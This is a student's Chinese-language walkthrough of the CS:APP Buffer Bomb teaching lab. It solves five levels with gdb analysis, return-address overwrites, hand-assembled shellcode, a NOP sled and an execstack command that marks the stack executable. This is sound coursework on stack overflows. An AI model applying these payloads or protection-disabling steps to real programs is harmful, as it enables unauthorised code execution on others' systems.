# The Buffer Bomb

## 准备工作

先对 bufbomb 有个大体认识。`objdump -d bufbomb` 查看 bufbomb 的整个反汇编代码，可以看到指导文件中涉及的几个主要的函数：`08048d60 <bang>`、`08048dc0 <fizz>`、`08048e20 <smoke>`、`08048fe0 <getbuf>`、`08049000 <test>`。缓冲区溢出的整体思路是 bufbomb 中的 getbuf 函数在读入字符数组时没有对 buf进行越界检查，溢出的字符将覆盖栈帧上的数据，当程序调用的返回地址被覆盖时，我们就可以让它跳转到我们想要执行的代码区域，从而达到攻击目的。`disassemble getbuf` 查看 getbuf
```
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
   0x08048fe0 <+0>:     push   %ebp
   0x08048fe1 <+1>:     mov    %esp,%ebp
   0x08048fe3 <+3>:     sub    $0x18,%esp    # 分配栈空间，24字节
   0x08048fe6 <+6>:     lea    -0xc(%ebp),%eax     # 为字符数组预留了 0xc 即 12 字节的空间，首地址为 -0xc(%ebp)
   0x08048fe9 <+9>:     mov    %eax,(%esp)
   0x08048fec <+12>:    call   0x8048e60 <Gets>
   0x08048ff1 <+17>:    mov    $0x1,%eax
   0x08048ff6 <+22>:    leave
   0x08048ff7 <+23>:    ret
End of assembler dump.

# 设置断点查看字符数组首地址
(gdb) b *0x08048fe9
Breakpoint 1 at 0x8048fe9
(gdb) run -t SA19225374+SA19225417+SA19225525
Starting program: /home/myclass/csapp/bufbomb -t SA19225374+SA19225417+SA19225525
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021

Breakpoint 1, 0x08048fe9 in getbuf ()
(gdb) i r
eax            0xffffb4dc          -19236
ecx            0xc                 12
edx            0xf7fa6890          -134584176
ebx            0x0                 0
esp            0xffffb4d0          0xffffb4d0
ebp            0xffffb4e8          0xffffb4e8
# 可以看出字符数组首地址为 -0xc(%ebp)=0xffffb4dc，即此时 %eax
```
字符数组首地址为 0xffffb4dc，字符数组 12 字节，然后是 4 字节的 %ebp，之后即为我们的目标——程序调用的返回地址，可算出此返回地址位于 0xffffb4ec。

## smoke

这一关要求执行主体函数 test 中的 getbuf 时，返回到 smoke 函数处执行。首先需要找到 smoke 函数地址。
```
(gdb) disassemble smoke
Dump of assembler code for function smoke:
   0x08048e20 <+0>:     push   %ebp    # 0x08048e20 即为 smoke 函数入口地址
(gdb) p/x &smoke        # 另一种查看方式
$1 = 0x8048e20
```
下一步就是用 smoke 函数入口地址覆盖我们之前推知的 getbuf 的返回地址。我们需要构造的字符串大小为 12+4+4=20 字节，且最后四个字节为 smoke 函数地址（注意以小端格式写入），填充（值可任意）如下：
```
01 00 00 00
02 00 00 00
03 00 00 00
04 00 00 00
20 8e 04 08
```
将该字符以空格分隔的 ASCII 码格式写入字符串文件 smoke.txt 中，运行 sendstring 进行转化后验证缓冲区溢出攻击是否有效。
```
~/myclass/csapp$  ./sendstring <smoke.txt> exploit_smoke.txt
~/myclass/csapp$ ls
bufbomb  buflab-handout.tar  exploit_smoke.txt  makecookie  sendstring  smoke.txt
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_smoke.txt
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:Smoke!: You called smoke()    # 调用成功
sh: 1: /usr/sbin/sendmail: not found      # sendmail 未安装
Error: Unable to send validation information to grading server

# sendmail 可通过 `sudo apt-get install sendmail` 指令安装
# 安装成功后运行结果如下
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_smoke.txt
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:Smoke!: You called smoke()    # 缓冲区溢出攻击有效
NICE JOB!
Sent validation information to grading server
```

## fizz

fizz 与 smoke 部分的大致思路相同，不过 fizz 需要将我们刚刚生成的 cookie 作为参数传入，参看 void fizz(int val)。
```
(gdb) disassemble fizz
Dump of assembler code for function fizz:
   0x08048dc0 <+0>:     push   %ebp          # fizz 的入口地址
   0x08048dc1 <+1>:     mov    %esp,%ebp
   0x08048dc3 <+3>:     push   %ebx
   0x08048dc4 <+4>:     sub    $0x14,%esp    # 分配栈空间，20字节
   0x08048dc7 <+7>:     mov    0x8(%ebp),%ebx      # 注意，此时的 0x8(%ebp) 即为参数 1 的位置
   0x08048dca <+10>:    movl   $0x1,(%esp)
   0x08048dd1 <+17>:    call   0x80489a0 <entry_check>
   0x08048dd6 <+22>:    cmp    0x804a1cc,%ebx
   
   # 比较传入参数与 0x804a1cc 处的存储值
   # (gdb) x/x 0x804a1cc
   # 0x804a1cc <cookie>:     0x46110021
   # gdb 查看可知 0x804a1cc 存储的即为我们的 cookie 值

   0x08048ddc <+28>:    je     0x8048e00 <fizz+64>
   0x08048dde <+30>:    mov    %ebx,0x4(%esp)      ###### 此处
   0x08048de2 <+34>:    movl   $0x8049898,(%esp)
   0x08048de9 <+41>:    call   0x8048764 <printf@plt>
   0x08048dee <+46>:    movl   $0x0,(%esp)
   0x08048df5 <+53>:    call   0x80487a4 <exit@plt>
   0x08048dfa <+58>:    lea    0x0(%esi),%esi
   0x08048e00 <+64>:    mov    %ebx,0x4(%esp)      ###### 此处
   0x08048e04 <+68>:    movl   $0x8049a29,(%esp)
   0x08048e0b <+75>:    call   0x8048764 <printf@plt>
   0x08048e10 <+80>:    movl   $0x1,(%esp)
   0x08048e17 <+87>:    call   0x8048ae0 <validate>
   0x08048e1c <+92>:    jmp    0x8048dee <fizz+46>
End of assembler dump.
```
![](https://github.com/Yudreamy/classlater/blob/master/csapp/datalab3/picture/structure.PNG)

由上图栈帧结构可知，返回地址+4 即为参数 1...参数 n，所以想要修改函数参数部分，只需要将 cookie 内容放在返回地址+4 的位置即可。
```
00 01 00 00
00 02 00 00
00 03 00 00
00 04 00 00
c0 8d 04 08
21 00 11 46
```
```
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_fizz.txt
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:Misfire: You called fizz(0x8049a00)
```
这里发现虽然调用了 fizz，但是产生了错误，参数没有正确地传进来。加断点调试看出了什么问题。
```
(gdb) run -t SA19225374+SA19225417+SA19225525 < exploit_fizz.txt
Starting program: /home/myclass/csapp/bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_fizz.txt
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021

Breakpoint 2, 0x08048fe6 in getbuf ()
(gdb) x/x $ebp                                     ###### 此处
0xffffb4e8:     0xffffb508
(gdb) s
Single stepping until exit from function getbuf,
which has no line number information.
0x08048dc0 in fizz ()
(gdb) x/x $ebp
0x400:  Cannot access memory at address 0x400
(gdb) i r
eax            0x1                 1
ecx            0x17                23
edx            0x0                 0
ebx            0x0                 0
esp            0xffffb4f0          0xffffb4f0      ###### 此处
ebp            0x400               0x400
```
注意 fizz 反汇编代码以及上边显示的所有 `###### 此处` 标记，getbuf() 函数中 %ebp 为 0xffffb4e8，fizz() 函数中 %esp 为 0xffffb4f0（即 0xffffb4e8+8）。所以 0xffffb4e8+8 位置为新的 %esp，参数位置相应地往后挪 4 个字节。修改 fizz.txt 再次运行。
```
00 01 00 00
00 02 00 00
00 03 00 00
00 04 00 00
c0 8d 04 08
00 00 00 00
21 00 11 46
```
结果如下，检验有效。
```
~/myclass/csapp$ vim fizz.txt
~/myclass/csapp$ ./sendstring < fizz.txt > exploit_fizz.txt
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_fizz.txt
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:Fizz!: You called fizz(0x46110021)
NICE JOB!
Sent validation information to grading server
```

## bang

### 攻击思路

本题不仅带参，而且还需要构建若干条指令来修改全局变量 global_value。
```
(gdb) disassemble bang
Dump of assembler code for function bang:
   0x08048d60 <+0>:     push   %ebp                # bang 入口地址
   0x08048d61 <+1>:     mov    %esp,%ebp
   0x08048d63 <+3>:     sub    $0x8,%esp           # 开辟栈空间，8 字节
   0x08048d66 <+6>:     movl   $0x2,(%esp)
   0x08048d6d <+13>:    call   0x80489a0 <entry_check>
   0x08048d72 <+18>:    mov    0x804a1dc,%eax
   0x08048d77 <+23>:    cmp    0x804a1cc,%eax

   # 需要将 0x804a1dc 和 0x804a1cc 处存的值比较
   # 由上阶段分析可知 0x804a1cc 存储的即为我们的 cookie 值
   # 通过 gdb 查看 0x804a1dc 的内容
   # (gdb) x/x  0x804a1dc
   # 0x804a1dc <global_value>:       0x00000000
   # 发现其存储内容即为我们的目标全局向量 global_value，初始值为 0
   # 所以，我们需要构造指令将全局变量 global_value 修改为我们的 cookie 值

   0x08048d7d <+29>:    je     0x8048da0 <bang+64>
   0x08048d7f <+31>:    mov    %eax,0x4(%esp)
   0x08048d83 <+35>:    movl   $0x8049a0b,(%esp)
   0x08048d8a <+42>:    call   0x8048764 <printf@plt>
   0x08048d8f <+47>:    movl   $0x0,(%esp)
   0x08048d96 <+54>:    call   0x80487a4 <exit@plt>
   0x08048d9b <+59>:    nop
   0x08048d9c <+60>:    lea    0x0(%esi,%eiz,1),%esi
   0x08048da0 <+64>:    mov    %eax,0x4(%esp)
   0x08048da4 <+68>:    movl   $0x8049870,(%esp)
   0x08048dab <+75>:    call   0x8048764 <printf@plt>
   0x08048db0 <+80>:    movl   $0x2,(%esp)
   0x08048db7 <+87>:    call   0x8048ae0 <validate>
   0x08048dbc <+92>:    jmp    0x8048d8f <bang+47>
End of assembler dump.
```
总结一下，我们需要自己实现一段代码，让 0x804a1dc 处的值修改为我们的 cookie 0x46110021，然后修改返回地址，让程序跳转到我们的代码处执行，最后跳转到 bang 函数。

### 攻击过程

由于字符数组首地址为 -0xc(%ebp)，要修改的返回地址在 +0x4(%ebp)，所以，我们攻击的 payload 代码部分最多（12+4+4）=20字节，其中最后 4 字节修改到返回地址，让它跳转到 payload 代码开始（即字符数组首地址 -0xc(%ebp)=0xffffb4dc 处）。首先，实现修改 global_value 的汇编代码，代码设计如下，内容很简单。
```
# 版本 1    ->注意反汇编二进制代码不能太长，大于 16 字节，则无法插入返回地址
mov 0x804a1cc,%eax         # 我们的 cookie 值
mov %eax,0x804a1dc         # 修改 global_value
push $0x08048d60           # bang 函数的入口地址
ret                        # 返回 bang

# 版本 2    ->发生错误 Error: too many memory references for `mov'，不能在一条 mov 指令中引用两个内存位置
mov 0x804a1cc,0x804a1dc    # 修改 global_value 为我们的 cookie 值
push $0x08048d60           # bang 函数的入口地址
ret                        # 返回 bang

# 版本 3    ->最终版本
mov $0x46110021,%eax       # 直接把 cookie 的值赋给 global_value
mov %eax,0x804a1dc
push $0x08048d60           # bang 函数的入口地址
ret                        # 返回 bang

p.s. 版本 1、版本 3 都是可行的
```
将代码存储为 bang.s，然后 `gcc -m32 -c bang.s` 把它转成对应的 IA32 二进制汇编代码，再 `objdump -d bang.o` 对生成的 .o文件反汇编生成二进制代码，得到代码的 ASCII 码格式。将 ASCII 码复制到最后攻击的 bang.txt 中，再加上 0xffffb4dc 返回地址共 20 字节，之后进行最后的攻击。
```
~/myclass/csapp$ gcc -m32 -c bang.s
bang.s: Assembler messages:
bang.s: Warning: end of file not at end of a line; newline inserted
~/myclass/csapp$ ls
bang.o  bang.s  bufbomb  buflab-handout.tar  exploit_fizz.txt  exploit_smoke.txt  fizz.txt  makecookie  sendstring  smoke.txt
~/myclass/csapp$ objdump -d bang.o

bang.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   b8 21 00 11 46          mov    $0x46110021,%eax
   5:   a3 dc a1 04 08          mov    %eax,0x804a1dc
   a:   68 60 8d 04 08          push   $0x8048d60
   f:   c3                      ret
```
bang.txt
```
b8 21 00 11
46 a3 dc a1
04 08 68 60 
8d 04 08 c3 
dc b4 ff ff
```
![](https://github.com/Yudreamy/classlater/blob/master/csapp/datalab3/picture/bang.PNG)
攻击成功！

### 错误处理

运行过程中出现 segmentation fault 报错
```
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_bang.txt
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
```
```c++
/* Signal handler to catch segmentation violations */
void seghandler(int sig)
{
  printf("Ouch!: You caused a segmentation fault!\n");
  printf("Better luck next time\n");
  exit(0);
}
```
查看 bufbomb 源码或其汇编代码发现，程序触发了 segmentation violation 错误。检索后知道，segmentation violation：当ArcView尝试访问其没有权限的内存地址（例如内存进程空间或内存的只读部分）时，就会发生分段错误。此处涉及到系统的两个保护机制：栈执行限制以及随机地址空间分配（ASLR），尝试解决。
```
~/myclass/csapp$ execstack -s bufbomb           # 将 bufbomb 标记为需要可执行堆栈
~/myclass/csapp$ execstack -q bufbomb           # 显示 bufbomb 的可执行堆栈标记
X bufbomb
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_bang.txt -s   # 执行
# 执行时发现命令行下还是会报跟上边同样的错误，但此时进入 gdb 执行发现攻击成功
# ASLR 机制会使系统对地址进行随机分配，而 gdb 下会关闭 ASLR
# 所以，在 gdb 中找到的地址只在 gdb 下有效，而程序实际运行时的地址是随机未知的，用 gdb 下找到的地址来运行会发生错误
```

## dynamite

按照文档描述，本环节需要修改 test 函数的执行，getbuf 函数正常返回时执行第 15 行，我们的目标是让它执行第 12 行的 `printf("Boom!: getbuf returned 0x%x\n", val); `，注意到此前有一个判断条件 `val == cookie`，所以，我们需要将 getbuf 返回的 val 修改为我们的 cookie。
```c++
# test 源码
void test() 
{
   int val; 
   volatile int local = 0xdeadbeef; 
   entry_check(3); /* Make sure entered this function properly */ 
   val = getbuf(); 
   /* Check for corrupted stack */ 
   if (local != 0xdeadbeef) {
      printf("Sabotaged!: the stack has been corrupted\n"); 
   }
   else if (val == cookie) {
      printf("Boom!: getbuf returned 0x%x\n", val); 
      validate(3); 
   }
   else {
      printf("Dud: getbuf returned 0x%x\n", val); 
   } 
}

# test 反汇编代码
(gdb) disassemble test
Dump of assembler code for function test:
   0x08049000 <+0>:     push   %ebp
   0x08049001 <+1>:     mov    %esp,%ebp
   0x08049003 <+3>:     sub    $0x18,%esp             # 分配栈帧，24 字节
   0x08049006 <+6>:     movl   $0xdeadbeef,-0x4(%ebp)
   0x0804900d <+13>:    movl   $0x3,(%esp)
   0x08049014 <+20>:    call   0x80489a0 <entry_check>
   0x08049019 <+25>:    call   0x8048fe0 <getbuf>     # 调用 getbuf 函数
   0x0804901e <+30>:    mov    %eax,%edx
   # 查看 getbuf 的返回值
   # Breakpoint 1, 0x0804901e in test ()
   # (gdb) i r
   # eax            0x1                 1
   # getbuf 的返回值为 1，我们要将其修改为 cookie

   0x08049020 <+32>:    mov    -0x4(%ebp),%eax
   0x08049023 <+35>:    cmp    $0xdeadbeef,%eax
   0x08049028 <+40>:    je     0x8049038 <test+56>
   0x0804902a <+42>:    movl   $0x80498b8,(%esp)
   0x08049031 <+49>:    call   0x8048714 <puts@plt>
   0x08049036 <+54>:    leave
   0x08049037 <+55>:    ret
   0x08049038 <+56>:    cmp    0x804a1cc,%edx
   0x0804903e <+62>:    je     0x8049052 <test+82>
   0x08049040 <+64>:    mov    %edx,0x4(%esp)
   0x08049044 <+68>:    movl   $0x8049a9b,(%esp)
   0x0804904b <+75>:    call   0x8048764 <printf@plt>
   0x08049050 <+80>:    leave
   0x08049051 <+81>:    ret
   0x08049052 <+82>:    mov    %edx,0x4(%esp)
   0x08049056 <+86>:    movl   $0x8049a7e,(%esp)
   0x0804905d <+93>:    call   0x8048764 <printf@plt>
   0x08049062 <+98>:    movl   $0x3,(%esp)
   0x08049069 <+105>:   call   0x8048ae0 <validate>
   0x0804906e <+110>:   leave
   0x0804906f <+111>:   ret
End of assembler dump.

# 此外，程序不能修改原始栈帧 %ebp，通过 gdb 设断点查看
Breakpoint 1, 0x08048fe6 in getbuf ()
(gdb) si
0x08048fe9 in getbuf ()
(gdb) x/x $ebp
0xffffb4e8:     0xffffb508
```
至此可得我们需要修改 getbuf 的返回值，即修改相应 %eax 的内容，可通过类似 bang 的方法实现，过程如下。
```
# 编辑汇编代码，保存为 dynamite.s
mov 0x804a1cc,%eax         # 将 cookie 放入返回寄存器 %eax 中
push $0x0804901e           # 返回到调用 getbuf 的下一条指令处执行
ret

~/myclass/csapp$ gcc -m32 -c dynamite.s
dynamite.s: Assembler messages:
dynamite.s: Warning: end of file not at end of a line; newline inserted
~/myclass/csapp$ objdump -d dynamite.o

dynamite.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   a1 cc a1 04 08          mov    0x804a1cc,%eax
   5:   68 1e 90 04 08          push   $0x804901e
   a:   c3                      ret

# 编辑 string 部分，思路同 bang
a1 cc a1 04
08 68 1e 90
04 08 c3 00
e8 b4 ff ff
dc b4 ff ff

# 进行攻击
~/myclass/csapp$ ./sendstring < dynamite.txt > exploit_dynamite.txt
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_dynamite.txt
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
~/myclass/csapp$ gdb bufbomb
Type "apropos word" to search for commands related to "word"...
Reading symbols from bufbomb...done.
(gdb) r -t SA19225374+SA19225417+SA19225525 < exploit_dynamite.txt
```

![](https://github.com/Yudreamy/classlater/blob/master/csapp/datalab3/picture/dynamite.PNG)

攻击成功！

## nitro

此关卡需要加 -n 参数进入，bufbomb 将调用另外两个函数：testn() 和 getbufn()，需要达到的攻击效果与上一关 dynamite 一样。
```c++
int getbufn()
{
   char buf[512];
   Gets(buf);                 ////调用 Gets()
   return 1;
}

void testn()
{
   int val;
   volatile int local = 0xdeadbeef;
   entry_check(4);  //Make sure entered this function properly
   val = getbufn();           ////调用 getbufn()
   //Check for corrupted stack
   if (local != 0xdeadbeef) {
      printf("Sabotaged!: the stack has been corrupted\n");
   }
   else if (val == cookie) {
      printf("KABOOM!: getbufn returned 0x%x\n", val);
      validate(4);
   }
   else {
      printf("Dud: getbufn returned 0x%x\n", val);
   }
}

char *Gets(char *dest)
{
  int c, hc;
  int even = 1; /* Have read even number of digits */
  int otherd = 0; /* Other hex digit of pair */
  char *sp = dest;

  gets_cnt = 0;
  if (!hexformat) {
     while ((c = getc(infile)) != EOF && c != '\n') {
	  *sp++ = c;
	  save_char(c);
     }
  } else {
     while ((hc = getc(infile)) != EOF && hc != '\n') {
        if (isxdigit(hc)) {
           int val;
           if ('0' <= hc && hc <= '9') val = hc - '0';
           else if ('A' <= hc && hc <= 'F')  val = hc - 'A' + 10;
           else   val = hc - 'a' + 10;
           if (even) {
              otherd = val;
              even = 0;
           } else {
               c = otherd * 16 + val;
               *sp++ = c;
               save_char(c);
               even = 1;
            }
         }
      }
  }
  *sp++ = '\0';
  save_term();
  return dest;
}

```
区别在于，getbufn 读入 512 字节，远远大于之前的 12 字节。先把程序跑起来看看再说。
```
(gdb) r -t SA19225374+SA19225417+SA19225525 -h           # 查看帮助说明
Starting program: /home/myclass/csapp/bufbomb -t SA19225374+SA19225417+SA19225525 -h
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Usage: /home/myclass/csapp/bufbomb -t team [-n] [-s] [-h]
        -t team:   Specify team name
        -n :       Nitro mode                         # -n 选项为 Nitro mode
        -s :       Submit solution via email
        -h :       Print help information
[Inferior 1 (process 25149) exited normally]
(gdb) r -t SA19225374+SA19225417+SA19225525 -n
Starting program: /home/andrewng/workspace/zyy/myclass/csapp/bufbomb -t SA19225374+SA19225417+SA19225525 -n
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:e                                   # 程序要求我们 Type string 5 次
Dud: getbufn returned 0x1
Better luck next time
Type string:e
Dud: getbufn returned 0x1
Better luck next time
Type string:r
Dud: getbufn returned 0x1
Better luck next time
Type string:t
Dud: getbufn returned 0x1
Better luck next time
Type string:y
Dud: getbufn returned 0x1
Better luck next time
[Inferior 1 (process 25153) exited normally]

# 结合此处的输入 5 次找到程序代码的相应位置
for (i = 0; i < cnt; i++)           //位于最后的 main 函数中
	launch(nitro, offsets[i]+cookie_tweak);
```
由运行结果及代码得知，-n 模式运行会要求我们输入 5 次字符串，继而调用 getbufn 5 次，此时返回值均为 0x1。每次调用栈的初始地址都会发生变化，因此，此关卡我们不能通过直接修改地址来达到我们的攻击目的。对应的解决方法可以是使用 nop（0x90）填充目标 512 字节，然后把我们编辑的代码放在目标 512 字节的尾巴上，nop指令作用的详细说明参见 [网址](https://blog.csdn.net/erazy0/article/details/6071281)。nop (空操作) 指令执行时除了程序计数器 PC 自加，别的什么也不做，这样在一定范围内，程序执行最后都会跳到我们插入的代码部分。此外，由于 entry_check 的存在，程序不能修改原始栈帧 %ebp，下一步通过 gdb 监视 %ebp 变化。
```
(gdb) disassemble getbufn
Dump of assembler code for function getbufn:
   0x08048f50 <+0>:     push   %ebp
   0x08048f51 <+1>:     mov    %esp,%ebp
   0x08048f53 <+3>:     sub    $0x208,%esp
   0x08048f59 <+9>:     lea    -0x200(%ebp),%eax
   0x08048f5f <+15>:    mov    %eax,(%esp)
   0x08048f62 <+18>:    call   0x8048e60 <Gets>
   0x08048f67 <+23>:    mov    $0x1,%eax
   0x08048f6c <+28>:    leave
   0x08048f6d <+29>:    ret
End of assembler dump.

(gdb) disassemble testn
Dump of assembler code for function testn:
   0x08048f70 <+0>:     push   %ebp
   0x08048f71 <+1>:     mov    %esp,%ebp
   0x08048f73 <+3>:     sub    $0x18,%esp
   0x08048f76 <+6>:     movl   $0xdeadbeef,-0x4(%ebp)
   0x08048f7d <+13>:    movl   $0x4,(%esp)
   0x08048f84 <+20>:    call   0x80489a0 <entry_check>
   0x08048f89 <+25>:    call   0x8048f50 <getbufn>
   0x08048f8e <+30>:    mov    %eax,%edx        # %eax 为 getbufn 的返回值

(gdb) b *0x08048f5f
Breakpoint 1 at 0x8048f5f
(gdb) r -t SA19225374+SA19225417+SA19225525 -n
Breakpoint 1, 0x08048f5f in getbufn ()
(gdb) i r
eax            0xffffb2e8          -19736
esp            0xffffb2e0          0xffffb2e0
ebp            0xffffb4e8          0xffffb4e8
Type string:c
Breakpoint 1, 0x08048f5f in getbufn ()
(gdb) i r
eax            0xffffb2e8          -19736
esp            0xffffb2e0          0xffffb2e0
ebp            0xffffb4e8          0xffffb4e8
Type string:2
Breakpoint 1, 0x08048f5f in getbufn ()
(gdb) i r
eax            0xffffb2b8          -19784
esp            0xffffb2b0          0xffffb2b0
ebp            0xffffb4b8          0xffffb4b8
Type string:i
Breakpoint 1, 0x08048f5f in getbufn ()
(gdb) i r
eax            0xffffb2b8          -19784
esp            0xffffb2b0          0xffffb2b0
ebp            0xffffb4b8          0xffffb4b8
Type string:#
Breakpoint 1, 0x08048f5f in getbufn ()
(gdb) i r
eax            0xffffb2e8          -19736
esp            0xffffb2e0          0xffffb2e0
ebp            0xffffb4e8          0xffffb4e8
Type string:1 
```
取 %eax 为 0xffffb2e8（运行过程中的最大值），作为我们的填充起点 and 返回地址。另外发现运行过程中 %ebp 在 0xffffb4b8~0xffffb4e8 间变化，但 %ebp、%esp之间差值固定，查看一下 testn 中两者差值。
```
0x08048f8e in testn ()
(gdb) i r
eax            0x1                 1
esp            0xffffb4f0          0xffffb4f0
ebp            0xffffb508          0xffffb508      # 两者相差 24 %ebp=0x18(%esp)
Breakpoint 2, 0x08048f76 in testn ()               # 再查看一次
(gdb) i r
eax            0xc                 12
esp            0xffffb4f0          0xffffb4f0      # 两者相差 24 %ebp=0x18(%esp)
ebp            0xffffb508          0xffffb508
Breakpoint 1, 0x08048f5f in getbufn ()             # 查看 getbuf 的 %ebp 和 %esp
(gdb) i r
eax            0xffffb2e8          -19736
esp            0xffffb2e0          0xffffb2e0
ebp            0xffffb4e8          0xffffb4e8
```
由于 testn 和 getbuf 两个函数的栈是连续的，可以看到上边 %esp(testn)=%ebp(getbufn)+0x8，而 %ebp(testn)-%ebp(getbufn)=0x20。在返回 test 时，%esp+0x18 为此时 %ebp 的值。接下来编辑攻击代码
```
mov $0x46110021,%eax       # cookie 作为返回值
lea 0x18(%esp),%ebp        # 更正 %ebp
push $0x08048f8e           # 返回到 testn 函数中调用 getbufn 的下一条指令
ret
```
nitro.txt
```
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 b8 21 00 11 46 8d 6c 24 18 68 8e
8f 04 08 c3 e8 b2 ff ff
```
最后来实现攻击效果。值得注意的是，由于 nitro 需要读入 5 次字符串，我们需要将此答案复制 5 次，换行输入。指导书里边说不能使用 '\n'（即 0x0a），解决方法为直接在 sendstring 时使用 '-n' 参数（这个是我试出来的）。

![](https://github.com/Yudreamy/classlater/blob/master/csapp/datalab3/picture/handbook.PNG)

```
# 出现错误，只攻击了一次
Starting program: /home/myclass/csapp/bufbomb -t SA19225374+SA19225417+SA19225525 -n < exploit_nitro.txt 5
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:KABOOM!: getbufn returned 0x46110021
Keep going                 # 这里说明我们的 payload 是正确的
Type string:Dud: getbufn returned 0x1
Type string:Dud: getbufn returned 0x1
Type string:Dud: getbufn returned 0x1
Type string:Dud: getbufn returned 0x1
[Inferior 1 (process 30952) exited normally]

# 尝试用将 nitro.txt 复制5次并用 0x0a（换行）隔开，报错
~/myclass/csapp$ ./sendstring < nitro.txt > exploit_nitro.txt
Warning: string contains eol
Warning: string contains eol
Warning: string contains eol

# 尝试在运行 sendstring 时使用 '-n' 参数
~/myclass/csapp$ ./sendstring < nitro.txt -n > exploit_nitro.txt
./sendstring: option requires an argument -- 'n'      # 提示 '-n' 缺一个参数，那当然是 5 啦

~/myclass/csapp$ ./sendstring < nitro.txt -n 5 > exploit_nitro.txt         # 成功
~/myclass/csapp$ ./bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_nitro.txt -n
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
~/myclass/csapp$ gdb bufbomb
(gdb) r -t SA19225374+SA19225417+SA19225525 < exploit_nitro.txt -n
Starting program: /home/myclass/csapp/bufbomb -t SA19225374+SA19225417+SA19225525 < exploit_nitro.txt -n
Team: SA19225374+SA19225417+SA19225525
Cookie: 0x46110021
Type string:KABOOM!: getbufn returned 0x46110021
Keep going
Type string:KABOOM!: getbufn returned 0x46110021
Keep going
Type string:KABOOM!: getbufn returned 0x46110021
Keep going
Type string:KABOOM!: getbufn returned 0x46110021
Keep going
Type string:KABOOM!: getbufn returned 0x46110021
[Detaching after fork from child process 30966]
NICE JOB!
Sent validation information to grading server
[Inferior 1 (process 30962) exited normally]
```

![](https://github.com/Yudreamy/classlater/blob/master/csapp/datalab3/picture/nitro.PNG)

攻击成功！

## 总结
- [x] smoke
- [x] fizz
- [x] bang
- [x] dynamite
- [x] nitro
- [x] [推荐阅读](http://zyearn.github.io/blog/2014/02/07/csapp-buf-lab/) 和 [bufbomb 完整 c 源码](https://github.com/maxgillett/coursera/blob/master/Hardware%20Software%20Interface/course-materials/lab3/bufbomb.c)